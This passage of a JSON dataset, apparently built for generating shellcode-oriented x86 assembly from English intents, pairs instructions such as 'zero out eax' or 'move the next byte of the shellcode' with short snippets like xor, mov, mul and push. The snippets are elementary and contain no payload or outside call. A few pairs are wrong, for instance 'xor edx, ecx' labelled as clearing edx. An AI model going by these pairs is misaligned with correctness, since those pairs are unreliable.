      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "set the eax register to null",
    "rewritten_intent": "set the eax register to null",
    "snippet": "xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "set",
      "var0",
      "register",
      "null"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out eax",
    "rewritten_intent": "zero out eax",
    "snippet": "xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the eax register",
    "rewritten_intent": "zero out the eax register",
    "snippet": "xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "init eax 0",
    "rewritten_intent": "init eax 0",
    "snippet": "xor eax, eax",
    "slot_map": {
      "init": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "set eax to 0",
    "rewritten_intent": "set eax to 0",
    "snippet": "xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "set",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the eax register and jump to the l3 label if the contents of the edx register is equal to the contents of the eax register",
    "rewritten_intent": "zero out the eax register and jump to the l3 label if the contents of the edx register is equal to the contents of the eax register",
    "snippet": "xor eax, eax \\n cmp edx, eax \\n je l3",
    "slot_map": {
      "eax": "var0",
      "l3": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var3",
      "register",
      "equal",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "cmp",
      "var3",
      ",",
      "var0",
      "\\n",
      "je",
      "var2"
    ]
  },
  {
    "intent": "zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register",
    "rewritten_intent": "zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register",
    "snippet": "xor eax, eax \\n cmp edx, eax \\n jne l3",
    "slot_map": {
      "eax": "var0",
      "l3": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var3",
      "register",
      "not",
      "equal",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "cmp",
      "var3",
      ",",
      "var0",
      "\\n",
      "jne",
      "var2"
    ]
  },
  {
    "intent": "clean the eax register and move the next byte of the shellcode into the lower byte of the register",
    "rewritten_intent": "clean the eax register and move the next byte of the shellcode into the lower byte of the register",
    "snippet": "xor eax, eax \\n mov al, [esi+1]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "register",
      "and",
      "move",
      "next",
      "byte",
      "shellcode",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "zero out eax and move 0x3 in the lowest byte of the register",
    "rewritten_intent": "zero out eax and move 0x3 in the lowest byte of the register",
    "snippet": "xor eax, eax \\n mov al, 0x3",
    "slot_map": {
      "0x3": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "move",
      "var1",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear eax and move 0x4 in the lowest byte of the register",
    "rewritten_intent": "clear eax and move 0x4 in the lowest byte of the register",
    "snippet": "xor eax, eax \\n mov al, 0x4",
    "slot_map": {
      "0x4": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "and",
      "move",
      "var1",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clean the eax register and move 5 in the lowest byte of the register",
    "rewritten_intent": "clean the eax register and move 5 in the lowest byte of the register",
    "snippet": "xor eax, eax \\n mov al, 5",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "register",
      "and",
      "move",
      "5",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "5"
    ]
  },
  {
    "intent": "push zero onto the stack",
    "rewritten_intent": "push zero onto the stack",
    "snippet": "xor eax, eax \\n push eax",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "zero",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "eax",
      ",",
      "eax",
      "\\n",
      "push",
      "eax"
    ]
  },
  {
    "intent": "zero out the eax register and push zero onto the stack",
    "rewritten_intent": "zero out the eax register and push zero onto the stack",
    "snippet": "xor eax, eax \\n push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "push",
      "zero",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "push",
      "var0"
    ]
  },
  {
    "intent": "clean eax, ebx, ecx and edx",
    "rewritten_intent": "clean eax, ebx, ecx and edx",
    "snippet": "xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1",
      "ecx": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "var1",
      "var2",
      "and",
      "var3"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "xor",
      "var2",
      ",",
      "var2",
      "\\n",
      "xor",
      "var3",
      ",",
      "var3"
    ]
  },
  {
    "intent": "zero out eax, ebx, ecx and edx registers",
    "rewritten_intent": "zero out eax, ebx, ecx and edx registers",
    "snippet": "xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1",
      "ecx": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "var1",
      "var2",
      "and",
      "var3",
      "registers"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "xor",
      "var2",
      ",",
      "var2",
      "\\n",
      "xor",
      "var3",
      ",",
      "var3"
    ]
  },
  {
    "intent": "clear eax, ebx and edx",
    "rewritten_intent": "clear eax, ebx and edx",
    "snippet": "xor eax, eax \\n xor ebx, ebx \\n xor edx, edx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "var1",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "xor",
      "var2",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform a logical xor between the eax register and the ebx register and save the result in eax",
    "rewritten_intent": "perform a logical xor between the eax register and the ebx register and save the result in eax",
    "snippet": "xor eax, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "var2",
      "register",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform xor operation between eax register and ebx register and store the result in eax",
    "rewritten_intent": "perform xor operation between eax register and ebx register and store the result in eax",
    "snippet": "xor eax, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "var0",
      "register",
      "and",
      "var2",
      "register",
      "and",
      "store",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform a logical xor between the eax register and the edi register and save the result in eax",
    "rewritten_intent": "perform a logical xor between the eax register and the edi register and save the result in eax",
    "snippet": "xor eax, edi",
    "slot_map": {
      "eax": "var0",
      "edi": "var2"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "var2",
      "register",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform a logical xor between the eax register and the esi register and save the result in eax",
    "rewritten_intent": "perform a logical xor between the eax register and the esi register and save the result in eax",
    "snippet": "xor eax, esi",
    "slot_map": {
      "eax": "var0",
      "esi": "var2"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "var2",
      "register",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform a logical xor between the ebx register and the ebp register and save the result in ebx",
    "rewritten_intent": "perform a logical xor between the ebx register and the ebp register and save the result in ebx",
    "snippet": "xor ebx, ebp",
    "slot_map": {
      "ebx": "var0",
      "ebp": "var2"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "var2",
      "register",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "initialize ebx with 0",
    "rewritten_intent": "initialize ebx with 0",
    "snippet": "xor ebx, ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "reset both lower and uppper bytes of ebx to be 0",
    "rewritten_intent": "reset both lower and uppper bytes of ebx to be 0",
    "snippet": "xor ebx, ebx",
    "slot_map": {
      "uppper": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "reset",
      "both",
      "lower",
      "and",
      "var0",
      "bytes",
      "var1",
      "be",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "zero out ebx",
    "rewritten_intent": "zero out ebx",
    "snippet": "xor ebx, ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear the ebx register",
    "rewritten_intent": "clear the ebx register",
    "snippet": "xor ebx, ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "init ebx 0",
    "rewritten_intent": "init ebx 0",
    "snippet": "xor ebx, ebx",
    "slot_map": {
      "init": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "reset ebx to 0",
    "rewritten_intent": "reset ebx to 0",
    "snippet": "xor ebx, ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "reset",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "set the ebx register to null",
    "rewritten_intent": "set the ebx register to null",
    "snippet": "xor ebx, ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "set",
      "var0",
      "register",
      "null"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register",
    "rewritten_intent": "zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register",
    "snippet": "xor ebx, ebx \\n cmp eax, ebx \\n je exit",
    "slot_map": {
      "ebx": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "jump",
      "exit",
      "label",
      "if",
      "contents",
      "var2",
      "register",
      "equal",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "cmp",
      "var2",
      ",",
      "var0",
      "\\n",
      "je",
      "exit"
    ]
  },
  {
    "intent": "clean the ebx register and move the next byte of the shellcode into the lower byte of the register",
    "rewritten_intent": "clean the ebx register and move the next byte of the shellcode into the lower byte of the register",
    "snippet": "xor ebx, ebx \\n mov bl, [esi+1]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "register",
      "and",
      "move",
      "next",
      "byte",
      "shellcode",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "bl",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "clear the ebx register and move the next byte of the shellcode into the lower byte of the register",
    "rewritten_intent": "clear the ebx register and move the next byte of the shellcode into the lower byte of the register",
    "snippet": "xor ebx, ebx \\n mov bl, [esi+1]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "move",
      "next",
      "byte",
      "shellcode",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "bl",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "zero out ebx and move 0x3 in the lowest byte of the register",
    "rewritten_intent": "zero out ebx and move 0x3 in the lowest byte of the register",
    "snippet": "xor ebx, ebx \\n mov bl, 0x3",
    "slot_map": {
      "0x3": "var1",
      "ebx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "move",
      "var1",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "bl",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear the ebx register and move 2 in the lowest byte of the register",
    "rewritten_intent": "clear the ebx register and move 2 in the lowest byte of the register",
    "snippet": "xor ebx, ebx \\n mov bl, 2",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "move",
      "2",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "bl",
      ",",
      "2"
    ]
  },
  {
    "intent": "clean the ebx register and move 5 in the lowest byte of the register",
    "rewritten_intent": "clean the ebx register and move 5 in the lowest byte of the register",
    "snippet": "xor ebx, ebx \\n mov bl, 5",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "register",
      "and",
      "move",
      "5",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "bl",
      ",",
      "5"
    ]
  },
  {
    "intent": "zero out the eax and ebx register",
    "rewritten_intent": "zero out the eax and ebx register",
    "snippet": "xor ebx, ebx \\n mul ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "mul",
      "var1"
    ]
  },
  {
    "intent": "zero out the eax register and the ebx register",
    "rewritten_intent": "zero out the eax register and the ebx register",
    "snippet": "xor ebx, ebx \\n mul ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "mul",
      "var1"
    ]
  },
  {
    "intent": "clear ecx and eax",
    "rewritten_intent": "clear ecx and eax",
    "snippet": "xor ebx, ebx \\n mul ebx",
    "slot_map": {
      "ecx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "ebx",
      ",",
      "ebx",
      "\\n",
      "mul",
      "ebx"
    ]
  },
  {
    "intent": "zero out ecx, edx and eax",
    "rewritten_intent": "zero out ecx, edx and eax",
    "snippet": "xor ebx, ebx \\n mul ebx",
    "slot_map": {
      "ecx": "var0",
      "edx": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "var1",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "xor",
      "ebx",
      ",",
      "ebx",
      "\\n",
      "mul",
      "ebx"
    ]
  },
  {
    "intent": "clean eax and edx",
    "rewritten_intent": "clean eax and edx",
    "snippet": "xor ebx, ebx \\n mul ebx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "ebx",
      ",",
      "ebx",
      "\\n",
      "mul",
      "ebx"
    ]
  },
  {
    "intent": "zero out eax and edx",
    "rewritten_intent": "zero out eax and edx",
    "snippet": "xor ebx, ebx \\n mul ebx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "ebx",
      ",",
      "ebx",
      "\\n",
      "mul",
      "ebx"
    ]
  },
  {
    "intent": "push zero onto the stack",
    "rewritten_intent": "push zero onto the stack",
    "snippet": "xor ebx, ebx \\n push ebx",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "zero",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "ebx",
      ",",
      "ebx",
      "\\n",
      "push",
      "ebx"
    ]
  },
  {
    "intent": "clear the ebx register and push its contents onto the stack",
    "rewritten_intent": "clear the ebx register and push its contents onto the stack",
    "snippet": "xor ebx, ebx \\n push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "push",
      "its",
      "contents",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "push",
      "var0"
    ]
  },
  {
    "intent": "zero out ebx and edx",
    "rewritten_intent": "zero out ebx and edx",
    "snippet": "xor ebx, ebx \\n xor edx, edx",
    "slot_map": {
      "ebx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx",
    "rewritten_intent": "perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx",
    "snippet": "xor ebx, word __flag_byte",
    "slot_map": {
      "ebx": "var0",
      "__flag_byte": "var2"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "word",
      "var2",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "word",
      "var2"
    ]
  },
  {
    "intent": "perform a logical xor between the ecx register and the dh register and save the result in ecx",
    "rewritten_intent": "perform a logical xor between the ecx register and the dh register and save the result in ecx",
    "snippet": "xor ecx, dh",
    "slot_map": {
      "ecx": "var0",
      "dh": "var2"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "var2",
      "register",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "initialize ecx to zero",
    "rewritten_intent": "initialize ecx to zero",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "initialize ecx with decimal value 0",
    "rewritten_intent": "initialize ecx with decimal value 0",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "decimal",
      "value",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "reset both lower and uppper bytes of ecx to be 0",
    "rewritten_intent": "reset both lower and uppper bytes of ecx to be 0",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "uppper": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "reset",
      "both",
      "lower",
      "and",
      "var0",
      "bytes",
      "var1",
      "be",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "set the ecx register to null",
    "rewritten_intent": "set the ecx register to null",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "set",
      "var0",
      "register",
      "null"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the ecx register",
    "rewritten_intent": "zero out the ecx register",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out ecx",
    "rewritten_intent": "zero out ecx",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "reset ecx to 0",
    "rewritten_intent": "reset ecx to 0",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "reset",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear the ecx register",
    "rewritten_intent": "clear the ecx register",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register",
    "rewritten_intent": "zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register",
    "snippet": "xor ecx, ecx \\n cmp ebx, ecx \\n je l1",
    "slot_map": {
      "ecx": "var0",
      "l1": "var2",
      "ebx": "var3"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var3",
      "register",
      "equal",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "cmp",
      "var3",
      ",",
      "var0",
      "\\n",
      "je",
      "var2"
    ]
  },
  {
    "intent": "clean the ecx register and move the next byte of the shellcode into the lower byte of the register",
    "rewritten_intent": "clean the ecx register and move the next byte of the shellcode into the lower byte of the register",
    "snippet": "xor ecx, ecx \\n mov cl, [esi+1]",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "register",
      "and",
      "move",
      "next",
      "byte",
      "shellcode",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "cl",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "clear the ecx register and move the next byte of the shellcode into the lower byte of the register",
    "rewritten_intent": "clear the ecx register and move the next byte of the shellcode into the lower byte of the register",
    "snippet": "xor ecx, ecx \\n mov cl, [esi+1]",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "move",
      "next",
      "byte",
      "shellcode",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "cl",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "clear ecx and move 0x4 in the lowest byte of the register",
    "rewritten_intent": "clear ecx and move 0x4 in the lowest byte of the register",
    "snippet": "xor ecx, ecx \\n mov cl, 0x4",
    "slot_map": {
      "0x4": "var1",
      "ecx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "and",
      "move",
      "var1",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "cl",
      ",",
      "var1"
    ]
  },
  {
    "intent": "zero out eax and ecx",
    "rewritten_intent": "zero out eax and ecx",
    "snippet": "xor ecx, ecx \\n mul ecx",
    "slot_map": {
      "eax": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "mul",
      "var1"
    ]
  },
  {
    "intent": "zero out ecx, edx and eax",
    "rewritten_intent": "zero out ecx, edx and eax",
    "snippet": "xor ecx, ecx \\n mul ecx",
    "slot_map": {
      "ecx": "var0",
      "edx": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "var1",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mul",
      "var0"
    ]
  },
  {
    "intent": "clean eax and edx",
    "rewritten_intent": "clean eax and edx",
    "snippet": "xor ecx, ecx \\n mul ecx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "ecx",
      ",",
      "ecx",
      "\\n",
      "mul",
      "ecx"
    ]
  },
  {
    "intent": "zero out eax and edx",
    "rewritten_intent": "zero out eax and edx",
    "snippet": "xor ecx, ecx \\n mul ecx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "ecx",
      ",",
      "ecx",
      "\\n",
      "mul",
      "ecx"
    ]
  },
  {
    "intent": "push zero onto the stack",
    "rewritten_intent": "push zero onto the stack",
    "snippet": "xor ecx, ecx \\n push ecx",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "zero",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "ecx",
      ",",
      "ecx",
      "\\n",
      "push",
      "ecx"
    ]
  },
  {
    "intent": "clear the ecx register and push its contents onto the stack",
    "rewritten_intent": "clear the ecx register and push its contents onto the stack",
    "snippet": "xor ecx, ecx \\n push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "push",
      "its",
      "contents",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "push",
      "var0"
    ]
  },
  {
    "intent": "zero out the ecx register and push zero onto the stack",
    "rewritten_intent": "zero out the ecx register and push zero onto the stack",
    "snippet": "xor ecx, ecx \\n push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "push",
      "zero",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "push",
      "var0"
    ]
  },
  {
    "intent": "initialize edi with 0",
    "rewritten_intent": "initialize edi with 0",
    "snippet": "xor edi, edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear the edi register",
    "rewritten_intent": "clear the edi register",
    "snippet": "xor edi, edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clean the edx register and move the next byte of the shellcode into the lower byte of the register",
    "rewritten_intent": "clean the edx register and move the next byte of the shellcode into the lower byte of the register",
    "snippet": "xor edx, ecx \\n mov dl, [esi+1]",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clean",
      "var0",
      "register",
      "and",
